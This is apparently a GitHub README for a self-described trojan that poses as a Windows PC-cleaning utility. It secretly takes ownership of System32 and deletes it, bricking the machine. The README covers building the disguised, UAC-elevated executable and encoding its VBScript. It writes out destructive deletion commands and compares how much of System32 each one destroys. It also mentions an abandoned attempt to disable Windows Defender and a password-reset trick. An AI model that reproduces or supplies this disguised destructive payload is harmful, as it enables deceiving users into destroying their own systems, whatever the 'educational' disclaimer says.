# What is Trojan.BAT.PC-Optimizer-Pro?
As its name suggests, it is a batchfile trojan, pretending to be something while doing something else. It was my 2020 attempt at being funny after reading a lot about the funny "delete System32" joke and learning some batchfile.

**2026 Update:** It is completely *rewritten* into powershell since it was more easier to write stuff in that tbh. So I guess it's now a **Trojan.PS.PC-Optimizer-Pro**?? xd idk i'm honestly too lazy to change the name of the repo, and i guess it technically calls cmd in the script so i'll just keep the name as-is

The program will pretend to be a windows PC cleaning utility, scanning for unneeded files, and then prompting the user to delete them. This will result in the user unwittingly deleting their System32 folder, as an internet meme xD.

<sub>Also tbh this stupid project took way too much testing on VMs to finalize lol. And I also forgot my Win10 VM password so that is very nice 🙃</sub><br>
<sub><sup>did you know if you are in an admin account in an open computer, you can simply do `net users [user] [new password]` to change `[user]`'s account to `[new password]`?? lowkey saved all of my VMs ngl</sup></sub>
  
# Usage
To use the program, simply download the release, or repo. If you downloaded the repo, you have to "compile" the project yourself (you technically don't need to, but for pure aesthetic purposes, please do lol). This is detailed below. If you downloaded the repease, simply run the executable, allowing it administrator permissions when it requests it.

The program will load up a terminal and run several "tree" commands to make it look like it is scanning for unneeded files. In the meantime, there are supressed `takeown` and `icacls` commands that give the current user full control of the the System32 directory. It will subsequently prompt the user to "remove" unneeded files, and as a result, silently remove the System32 directory. **This will FULLY BRICK the PC, and require a fresh reinstall of Windows to remedy. Use this program with caution.**

I initially included a paylod that tried to disable Windows Defender, but due to tamper protection, even if the real-time protection is disabled via registry, Defender still somehow manages to run and shut down the payload (good on microsoft lmao). True workarounds (eicars dll injection crashing, registry tweaks to disable the driver on older versions) are too compmlicated to be implemented into a true self-contained PS/batchfile script, so are beyond the scope of what I'm trying to achieve and i hence removed it.

Funnily enough, for the older version (v2.0) Windows Defender actually registers this as a *severe* virus, named *Trojan:Win32/Wacatac.B!ml*. Kinda honored that a shitty batchfile program could be registered as a virus by Defender 😁. If you're curious as to what this means, the "*!ml*" means machine learning, referring to a program that Microsoft has that tries to learn which features of executables are common to malware and which aren't, while "*Wacatac.B*" is an just identifier name that only makes sense to Microsoft to determine which model detected it when troubleshooting. A full VirusTotal analysis can be found [here](https://www.virustotal.com/gui/file/1675047e96cc76cf3e157c839e039ed49a8af8ffc613c94d013c2f4190e35117), where it was flagged by an additional 14+ out of 70 antiviruses.

The newer v3.0 I won't submit because ngl VT sends this shit to all the antivirus vendors which is good but bloats the detection score (it starts off like with 4 detections and bloats to 20+ in a few weeks lol) but should be generally the same amount of true flags as v2. You can submit it yourself ig tho, i can't stop you if you do lol

Also note that if you don't compile the program yourself and use the pre-compiled one in the releases, the standard blue window of "are you sure you want to run this executable" will pop up (which you can continue to run the file by selecting *More Info → Run Anyways*).

## How to "Compile"
In my prior versions, I had this complicated ass process where you used like a bat2exe converter, resource hacker, and a vbs-vbe tool, which was a complete mess. Now, you can compile by directly running `build.ps1`. `build.ps1` installs an open source "powershell to executable wrapper" package `ps2exe.1.0.17.nupkg` that I've included in the root of the repo (but you can also install online via `Install-Module ps2exe`, I just like having a local copy). Then it prompts you to include your choice of a warning script, which it then injects into the main powershell script `PC Optimizer Pro.ps1`, and wraps it into an executable that has the `computer.ico` icon and UAC elevation.

I would recommend you encrypt (or rather, obfuscate ig) the `Warning.vbs` into `Warning.vbe` (though I give you the option to use either in the build/compile script) to use in your final executable, as it's aesthetically more pleasing. You can do this by dragging the `.vbs` file onto the `Encode.vbs` after extracing it from the `vba-to-vbe.zip` tool archive.

Congratulations! You have just """compiled""" Trojan. <s>BAT</s> PS.PC-Optimizer-Pro ("compiled" put in a very, very, loose way lmao, for obvious reasons)! :) You should now have a standalone executable. Running the executable will run the trojan.

## Dependencies
This program uses the command prompt, powershell and VBScript, so on the computer running it, both the visual basic script hosts and cmd/ps must be present...

<sub>which is literally every default win10 (win11 can go fuck itself, but afaik it also works) installation xD shush<sub>

## Deletion Efficiency
which brings us to the fact that when deleting System32, it literally deletes the very files it needs to run itself and crashes lol. I've tested multiple commands, like
1. `del "C:\Windows\System32" /f /q /s > NUL 2>&1` or `cmd /c "del C:\Windows\System32 /f /q /s" 2>&1 | Out-Null`
2. `rd /s /q "C:\Windows\System32" > NUL 2>&1` or `cmd /c "rd /s /q C:\Windows\System32" 2>&1 | Out-Null`
3. `Remove-Item "C:\Windows\System32\*" -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue`

that either are running natively on the default windows installtion, or on a standalone [powershell](https://github.com/PowerShell/PowerShell) (v7 ish, check the releases section for the .zip like `PowerShell-7.5.4-win-x64.zip`), and obtained the following results (all sizes are obtained by `dir /s/a` on the `System32` directory).

**Baseline (Untouched System32):**
- 12,456 files
- 2,766,840,890 bytes (~2.77 GB)
- 3,408 directories

#### Command 1: `del /f /q /s`
| Environment | Files Remaining | Bytes Remaining | Dirs Remaining | Deletion Rate (bytes) |
|-------------|-----------------|-----------------|----------------|---------------|
| Standalone PWsh v7 | 1,431 | 963,799,984 (~964 MB) | 4,133 | 65.17% |
| Native PWsh 5.1 | 1,385 | 961,388,438 (~961 MB) | 4,130 | 65.25% |

We note that `del` only deletes files, not directories, which explains why 4k+ directories remained. It's also curious how the standalone portable version of powershell performed worse.

#### Command 2: `rd /s /q` 
| Environment | Files Remaining | Bytes Remaining | Dirs Remaining | Deletion Rate (bytes) |
|-------------|-----------------|-----------------|----------------|---------------|
| Standalone PWsh v7 | 1,325 | 942,955,252 (~943 MB) | 263 | 65.92% |
| Native PWsh 5.1 | 1,410 | 937,427,002 (~937 MB) | 268 | 66.12% |

This is much better compared to `del`. And this time as expected, standalone powershell performed better.

#### Command 3: `Remove-Item`
| Environment | Files Remaining | Bytes Remaining | Dirs Remaining | Deletion Rate (bytes) |
|-------------|-----------------|-----------------|----------------|---------------|
| Standalone PWsh v7 | 1,391 | 867,433,619 (~867 MB) | 284 | 68.65% |
| Native PWsh 5.1 | 1,340 | 923,045,646 (~923 MB) | 258 | 66.64% |

This gives the best overall performance with the fewest bytes remaining, and the standalone powershell deleted an additional ~56 MB compared to the native one.

These commands were all tested only once, on my specific win10 VM setup, but should be representative of general results. The first and second best results are from the `Remove-Item` command using either standalone or native, but the ~56 MB difference doesn't warrant bundling a ~100 MB powershell runtime with the trojan lol, so I'll stick with using the native powershell runtime. The results in the meanwhile are not great, but not too bad either. Regardless, it definetely bricks the PC beyond recovery (eg beyond what startup repair can do), which is the point anyways.

# Disclaimers
I **DID NOT** write the `vba-to-vbe.zip`, or the PS2EXE package. The authors, credits, and copyrights to the vbe tool is within the zip file, and the PS2EXE package's repo is linked [here](https://github.com/MScholtes/PS2EXE).

**This program is purely made for EDUCATIONAL PURPOSES, with the assumption that the execution of the program will only be ran in a CONTROLLED TESTING ENVIRONMENT only!**. I do ***NOT*** enourage people to use this program on their own computers, much less computers that other people own. Using malware or any form of harmful software, including joke programs, on your own or others' computers, whether with or without consent, is **strictly prohibited** due to the potential for *severe and unintended consequences*.
